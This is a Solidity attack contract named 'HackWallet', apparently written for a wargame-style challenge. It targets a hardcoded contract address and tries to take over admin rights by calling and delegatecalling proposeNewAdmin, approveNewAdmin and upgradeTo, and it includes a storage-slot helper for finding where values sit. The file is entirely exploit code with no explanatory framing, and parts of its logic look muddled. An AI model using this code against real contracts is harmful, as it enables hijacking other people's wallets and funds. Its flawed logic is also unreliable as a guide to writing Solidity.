// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;


contract HackWallet{
    address public owner;
    address public admin;

    address his =0x4D9ce6713c212E3267f16f10EeD0aD373c60dd88;
    constructor()public {
        owner = msg.sender;
        admin = msg.sender;
    }

   function findMapLocation(uint256 slot, uint256 key) public pure returns (bytes32) {
    return bytes32(keccak256(abi.encode(key, slot)));
}


    function callproposeNewAdmin()public{
        his.call(abi.encodeWithSignature('proposeNewAdmin(address)', owner));
    }

    function callapproveNewAdmin()public{
        his.call(abi.encodeWithSignature('approveNewAdmin(address)', owner));
    }

    function delegatecallapproveNewAdmin()public{
        his.delegatecall(abi.encodeWithSignature('approveNewAdmin(address)', owner));
    }

    function delegatecallupgradeTo()public{
        his.delegatecall(abi.encodeWithSignature('upgradeTo(address)', address(this)));
    }

    
    function changeAdmin(address _newadm) public{
        admin=_newadm;
    }
    function deposit() public{
        admin=owner;
    }
}